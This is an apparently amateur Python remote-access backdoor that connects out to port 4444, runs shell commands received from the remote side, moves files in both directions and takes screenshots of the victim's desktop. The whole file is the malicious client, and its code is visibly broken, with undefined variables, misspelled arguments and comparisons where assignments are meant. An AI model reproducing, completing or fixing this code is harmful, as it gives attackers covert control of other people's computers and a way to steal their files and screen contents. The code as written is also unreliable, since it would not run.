import socket
import json
import subprocess
import os
import pyautogui


def dados_env():
    jsondata = json.dump(data)
    sock.send(jsondata.encode())

def dados_rec():
    dados  = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file):
    f = open(file, 'rb')
    sock.send(f.read())

def screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(screen.png)


def download_file(file):
    f = open(file, 'wb')
    sock.setTimeout(3)
    chunk = sock.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.setTimeout(None)
    f.close

def shell():
    while True:
        comando_foda = dados_rec()
        if comando_foda == 'exit':
            break
        elif comando_foda == 'clear':
            pass
        elif comando_foda [:3] == 'cd ':
            os.chdir(comando_foda[3:])
        elif comando_foda [:6] == 'upload':
            download_file(comando_foda[7:])
        elif comando_foda [:8] == 'download':
            upload_file(comando_foda[9:])
        elif comando_foda [:10] == 'screenshot':
            screenshot ()
            upload_file('screen.png')
            os.remove('screen.png')
        elif comando_foda == 'help':
            pass
        else:
            exe = subprocess.Popen(comando_foda, shell=True, stdout=subprocess.PIPE, sdterr=subprocess.PIPE, stdin=subprocess.PIPE)
            comando_foda_rec == exe.stdout.read() + exe.stderr.read()
            comando_foda_rec == comando_foda_rec.decode()
            dados_env(comando_foda_rec)

sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
sock.connect(("", 4444))
shell ()
